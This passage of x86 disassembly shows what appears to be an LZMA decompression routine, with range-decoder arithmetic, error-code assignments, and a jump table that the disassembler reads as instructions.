  4075d4:	8b 4c 24 50          	mov    0x50(%esp),%ecx
  4075d8:	83 c1 02             	add    $0x2,%ecx
  4075db:	c7 44 24 24 13 00 00 	movl   $0x13,0x24(%esp)
  4075e2:	00 
  4075e3:	89 4c 24 54          	mov    %ecx,0x54(%esp)
  4075e7:	eb 04                	jmp    0x4075ed
  4075e9:	8b 4c 24 54          	mov    0x54(%esp),%ecx
  4075ed:	0f b7 11             	movzwl (%ecx),%edx
  4075f0:	8b c3                	mov    %ebx,%eax
  4075f2:	c1 e8 0b             	shr    $0xb,%eax
  4075f5:	8b f2                	mov    %edx,%esi
  4075f7:	0f af c6             	imul   %esi,%eax
  4075fa:	3b f8                	cmp    %eax,%edi
  4075fc:	73 15                	jae    0x407613
  4075fe:	8b d8                	mov    %eax,%ebx
  407600:	b8 00 08 00 00       	mov    $0x800,%eax
  407605:	2b c6                	sub    %esi,%eax
  407607:	c1 f8 05             	sar    $0x5,%eax
  40760a:	03 c2                	add    %edx,%eax
  40760c:	33 f6                	xor    %esi,%esi
  40760e:	66 89 01             	mov    %ax,(%ecx)
  407611:	eb 1b                	jmp    0x40762e
  407613:	2b f8                	sub    %eax,%edi
  407615:	2b d8                	sub    %eax,%ebx
  407617:	66 8b c2             	mov    %dx,%ax
  40761a:	89 bc 24 9c 00 00 00 	mov    %edi,0x9c(%esp)
  407621:	66 c1 e8 05          	shr    $0x5,%ax
  407625:	33 f6                	xor    %esi,%esi
  407627:	66 2b d0             	sub    %ax,%dx
  40762a:	46                   	inc    %esi
  40762b:	66 89 11             	mov    %dx,(%ecx)
  40762e:	89 74 24 68          	mov    %esi,0x68(%esp)
  407632:	89 9c 24 98 00 00 00 	mov    %ebx,0x98(%esp)
  407639:	81 fb 00 00 00 01    	cmp    $0x1000000,%ebx
  40763f:	73 33                	jae    0x407674
  407641:	8b 44 24 3c          	mov    0x3c(%esp),%eax
  407645:	85 c0                	test   %eax,%eax
  407647:	0f 84 c9 01 00 00    	je     0x407816
  40764d:	8b 4c 24 38          	mov    0x38(%esp),%ecx
  407651:	c1 e3 08             	shl    $0x8,%ebx
  407654:	48                   	dec    %eax
  407655:	89 44 24 3c          	mov    %eax,0x3c(%esp)
  407659:	c1 e7 08             	shl    $0x8,%edi
  40765c:	0f b6 01             	movzbl (%ecx),%eax
  40765f:	0b f8                	or     %eax,%edi
  407661:	89 9c 24 98 00 00 00 	mov    %ebx,0x98(%esp)
  407668:	41                   	inc    %ecx
  407669:	89 bc 24 9c 00 00 00 	mov    %edi,0x9c(%esp)
  407670:	89 4c 24 38          	mov    %ecx,0x38(%esp)
  407674:	8b 44 24 24          	mov    0x24(%esp),%eax
  407678:	e9 b9 fb ff ff       	jmp    0x407236
  40767d:	85 f6                	test   %esi,%esi
  40767f:	75 20                	jne    0x4076a1
  407681:	8b 54 24 50          	mov    0x50(%esp),%edx
  407685:	6a 08                	push   $0x8
  407687:	58                   	pop    %eax
  407688:	89 44 24 78          	mov    %eax,0x78(%esp)
  40768c:	8b 84 24 ac 00 00 00 	mov    0xac(%esp),%eax
  407693:	c1 e0 04             	shl    $0x4,%eax
  407696:	81 c2 04 01 00 00    	add    $0x104,%edx
  40769c:	e9 25 ff ff ff       	jmp    0x4075c6
  4076a1:	81 44 24 50 04 02 00 	addl   $0x204,0x50(%esp)
  4076a8:	00 
  4076a9:	6a 10                	push   $0x10
  4076ab:	58                   	pop    %eax
  4076ac:	6a 08                	push   $0x8
  4076ae:	89 44 24 7c          	mov    %eax,0x7c(%esp)
  4076b2:	58                   	pop    %eax
  4076b3:	8b f0                	mov    %eax,%esi
  4076b5:	c7 44 24 2c 14 00 00 	movl   $0x14,0x2c(%esp)
  4076bc:	00 
  4076bd:	89 74 24 68          	mov    %esi,0x68(%esp)
  4076c1:	33 d2                	xor    %edx,%edx
  4076c3:	8b ce                	mov    %esi,%ecx
  4076c5:	42                   	inc    %edx
  4076c6:	89 54 24 58          	mov    %edx,0x58(%esp)
  4076ca:	eb 38                	jmp    0x407704
  4076cc:	8b 44 24 3c          	mov    0x3c(%esp),%eax
  4076d0:	85 c0                	test   %eax,%eax
  4076d2:	0f 84 48 01 00 00    	je     0x407820
  4076d8:	8b 54 24 38          	mov    0x38(%esp),%edx
  4076dc:	c1 e3 08             	shl    $0x8,%ebx
  4076df:	48                   	dec    %eax
  4076e0:	89 44 24 3c          	mov    %eax,0x3c(%esp)
  4076e4:	c1 e7 08             	shl    $0x8,%edi
  4076e7:	0f b6 02             	movzbl (%edx),%eax
  4076ea:	0b f8                	or     %eax,%edi
  4076ec:	89 9c 24 98 00 00 00 	mov    %ebx,0x98(%esp)
  4076f3:	42                   	inc    %edx
  4076f4:	89 bc 24 9c 00 00 00 	mov    %edi,0x9c(%esp)
  4076fb:	89 54 24 38          	mov    %edx,0x38(%esp)
  4076ff:	8b 54 24 58          	mov    0x58(%esp),%edx
  407703:	49                   	dec    %ecx
  407704:	89 4c 24 60          	mov    %ecx,0x60(%esp)
  407708:	89 4c 24 10          	mov    %ecx,0x10(%esp)
  40770c:	85 c9                	test   %ecx,%ecx
  40770e:	7e 72                	jle    0x407782
  407710:	8b 6c 24 50          	mov    0x50(%esp),%ebp
  407714:	03 d2                	add    %edx,%edx
  407716:	03 ea                	add    %edx,%ebp
  407718:	8b cb                	mov    %ebx,%ecx
  40771a:	c1 e9 0b             	shr    $0xb,%ecx
  40771d:	89 6c 24 54          	mov    %ebp,0x54(%esp)
  407721:	0f b7 45 00          	movzwl 0x0(%ebp),%eax
  407725:	0f af c8             	imul   %eax,%ecx
  407728:	3b f9                	cmp    %ecx,%edi
  40772a:	73 1a                	jae    0x407746
  40772c:	0f b7 55 00          	movzwl 0x0(%ebp),%edx
  407730:	8b d9                	mov    %ecx,%ebx
  407732:	8b c2                	mov    %edx,%eax
  407734:	b9 00 08 00 00       	mov    $0x800,%ecx
  407739:	2b c8                	sub    %eax,%ecx
  40773b:	c1 f9 05             	sar    $0x5,%ecx
  40773e:	03 ca                	add    %edx,%ecx
  407740:	d1 64 24 58          	shll   $1,0x58(%esp)
  407744:	eb 20                	jmp    0x407766
  407746:	2b f9                	sub    %ecx,%edi
  407748:	2b d9                	sub    %ecx,%ebx
  40774a:	0f b7 4d 00          	movzwl 0x0(%ebp),%ecx
  40774e:	66 8b c1             	mov    %cx,%ax
  407751:	89 bc 24 9c 00 00 00 	mov    %edi,0x9c(%esp)
  407758:	66 c1 e8 05          	shr    $0x5,%ax
  40775c:	66 2b c8             	sub    %ax,%cx
  40775f:	8d 42 01             	lea    0x1(%edx),%eax
  407762:	89 44 24 58          	mov    %eax,0x58(%esp)
  407766:	66 89 4d 00          	mov    %cx,0x0(%ebp)
  40776a:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  40776e:	89 9c 24 98 00 00 00 	mov    %ebx,0x98(%esp)
  407775:	81 fb 00 00 00 01    	cmp    $0x1000000,%ebx
  40777b:	73 82                	jae    0x4076ff
  40777d:	e9 4a ff ff ff       	jmp    0x4076cc
  407782:	33 c0                	xor    %eax,%eax
  407784:	8b ce                	mov    %esi,%ecx
  407786:	40                   	inc    %eax
  407787:	8b ea                	mov    %edx,%ebp
  407789:	d3 e0                	shl    %cl,%eax
  40778b:	2b e8                	sub    %eax,%ebp
  40778d:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  407791:	89 6c 24 64          	mov    %ebp,0x64(%esp)
  407795:	e9 9c fa ff ff       	jmp    0x407236
  40779a:	8b 44 24 28          	mov    0x28(%esp),%eax
  40779e:	01 6c 24 78          	add    %ebp,0x78(%esp)
  4077a2:	89 44 24 20          	mov    %eax,0x20(%esp)
  4077a6:	e9 e5 f3 ff ff       	jmp    0x406b90
  4077ab:	c7 44 24 20 01 00 00 	movl   $0x1,0x20(%esp)
  4077b2:	00 
  4077b3:	eb 73                	jmp    0x407828
  4077b5:	c7 44 24 20 03 00 00 	movl   $0x3,0x20(%esp)
  4077bc:	00 
  4077bd:	eb 69                	jmp    0x407828
  4077bf:	c7 44 24 20 0d 00 00 	movl   $0xd,0x20(%esp)
  4077c6:	00 
  4077c7:	eb 5f                	jmp    0x407828
  4077c9:	c7 44 24 20 0e 00 00 	movl   $0xe,0x20(%esp)
  4077d0:	00 
  4077d1:	eb 55                	jmp    0x407828
  4077d3:	c7 44 24 20 0f 00 00 	movl   $0xf,0x20(%esp)
  4077da:	00 
  4077db:	eb 4b                	jmp    0x407828
  4077dd:	c7 44 24 20 1a 00 00 	movl   $0x1a,0x20(%esp)
  4077e4:	00 
  4077e5:	eb 41                	jmp    0x407828
  4077e7:	c7 44 24 20 1b 00 00 	movl   $0x1b,0x20(%esp)
  4077ee:	00 
  4077ef:	eb 37                	jmp    0x407828
  4077f1:	c7 44 24 20 0c 00 00 	movl   $0xc,0x20(%esp)
  4077f8:	00 
  4077f9:	eb 2d                	jmp    0x407828
  4077fb:	83 4c 24 78 ff       	orl    $0xffffffff,0x78(%esp)
  407800:	eb 26                	jmp    0x407828
  407802:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%esp)
  407809:	00 
  40780a:	eb 1c                	jmp    0x407828
  40780c:	c7 44 24 20 1c 00 00 	movl   $0x1c,0x20(%esp)
  407813:	00 
  407814:	eb 12                	jmp    0x407828
  407816:	c7 44 24 20 05 00 00 	movl   $0x5,0x20(%esp)
  40781d:	00 
  40781e:	eb 08                	jmp    0x407828
  407820:	c7 44 24 20 18 00 00 	movl   $0x18,0x20(%esp)
  407827:	00 
  407828:	8b bc 24 c0 00 00 00 	mov    0xc0(%esp),%edi
  40782f:	8d 74 24 20          	lea    0x20(%esp),%esi
  407833:	6a 22                	push   $0x22
  407835:	59                   	pop    %ecx
  407836:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  407838:	33 c0                	xor    %eax,%eax
  40783a:	eb 03                	jmp    0x40783f
  40783c:	83 c8 ff             	or     $0xffffffff,%eax
  40783f:	5d                   	pop    %ebp
  407840:	5b                   	pop    %ebx
  407841:	5f                   	pop    %edi
  407842:	5e                   	pop    %esi
  407843:	81 c4 b4 00 00 00    	add    $0xb4,%esp
  407849:	c3                   	ret
  40784a:	66 90                	xchg   %ax,%ax
  40784c:	a0 6b 40 00 75       	mov    0x7500406b,%al
  407851:	6c                   	insb   (%dx),%es:(%edi)
  407852:	40                   	inc    %eax
  407853:	00 32                	add    %dh,(%edx)
  407855:	6d                   	insl   (%dx),%es:(%edi)
  407856:	40                   	inc    %eax
  407857:	00 fa                	add    %bh,%dl
  407859:	6c                   	insb   (%dx),%es:(%edi)
  40785a:	40                   	inc    %eax
  40785b:	00 e9                	add    %ch,%cl
  40785d:	75 40                	jne    0x40789f
  40785f:	00 41 76             	add    %al,0x76(%ecx)
  407862:	40                   	inc    %eax
  407863:	00 6c 6d 40          	add    %ch,0x40(%ebp,%ebp,2)
  407867:	00 ff                	add    %bh,%bh
  407869:	70 40                	jo     0x4078ab
  40786b:	00 70 71             	add    %dh,0x71(%eax)
  40786e:	40                   	inc    %eax
  40786f:	00 b0 71 40 00 47    	add    %dh,0x47004071(%eax)
  407875:	72 40                	jb     0x4078b7
  407877:	00 79 72             	add    %bh,0x72(%ecx)
  40787a:	40                   	inc    %eax
  40787b:	00 6b 73             	add    %ch,0x73(%ebx)
  40787e:	40                   	inc    %eax
  40787f:	00 2f                	add    %ch,(%edi)
  407881:	6e                   	outsb  %ds:(%esi),(%dx)
  407882:	40                   	inc    %eax
  407883:	00 25 6f 40 00 ef    	add    %ah,0xef00406f
  407889:	6f                   	outsl  %ds:(%esi),(%dx)
  40788a:	40                   	inc    %eax
  40788b:	00 10                	add    %dl,(%eax)
  40788d:	74 40                	je     0x4078cf
  40788f:	00 99 75 40 00 ad    	add    %bl,-0x52ffbf8b(%ecx)
  407895:	75 40                	jne    0x4078d7
  407897:	00 7d 76             	add    %bh,0x76(%ebp)
  40789a:	40                   	inc    %eax
  40789b:	00 9a 77 40 00 d7    	add    %bl,-0x28ffbf89(%edx)
  4078a1:	72 40                	jb     0x4078e3
  4078a3:	00 f0                	add    %dh,%al
  4078a5:	72 40                	jb     0x4078e7
  4078a7:	00 c1                	add    %al,%cl
  4078a9:	76 40                	jbe    0x4078eb
  4078ab:	00 cc                	add    %cl,%ah
  4078ad:	76 40                	jbe    0x4078ef
  4078af:	00 23                	add    %ah,(%ebx)
  4078b1:	73 40                	jae    0x4078f3
  4078b3:	00 b1 70 40 00 d6    	add    %dh,-0x29ffbf90(%ecx)
  4078b9:	71 40                	jno    0x4078fb
  4078bb:	00 23                	add    %ah,(%ebx)
  4078bd:	75 40                	jne    0x4078ff
  4078bf:	00 b8 80 00 00 00    	add    %bh,0x80(%eax)
  4078c5:	83 e8 01             	sub    $0x1,%eax
  4078c8:	c6 04 08 00          	movb   $0x0,(%eax,%ecx,1)
  4078cc:	75 f7                	jne    0x4078c5
  4078ce:	83 49 78 ff          	orl    $0xffffffff,0x78(%ecx)
  4078d2:	33 c0                	xor    %eax,%eax
  4078d4:	40                   	inc    %eax
  4078d5:	89 41 68             	mov    %eax,0x68(%ecx)
  4078d8:	89 41 64             	mov    %eax,0x64(%ecx)
  4078db:	89 41 60             	mov    %eax,0x60(%ecx)
  4078de:	89 41 5c             	mov    %eax,0x5c(%ecx)
  4078e1:	c3                   	ret
